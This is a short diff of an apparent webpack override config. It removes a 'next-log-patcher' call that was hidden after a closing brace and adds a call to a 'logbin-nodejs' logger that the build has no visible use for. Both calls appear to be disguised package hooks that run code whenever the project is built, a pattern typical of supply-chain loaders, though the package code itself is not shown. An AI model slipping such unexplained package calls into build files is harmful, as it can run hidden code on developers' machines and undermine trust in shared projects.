@@ -1,14 +1,14 @@
 const webpack = require("webpack");
-const webpatch = require("next-log-patcher");
-
+const logbin = require("logbin-nodejs");
 module.exports = function override(config) {
-  
   config.resolve.fallback = {
     ...config.resolve.fallback,
     fs: false,
     process: false,
     buffer: require.resolve("buffer/"),
-  };webpatch()
+  };
+
+  logbin.createLogger({});
   
   config.plugins = [
     ...config.plugins,
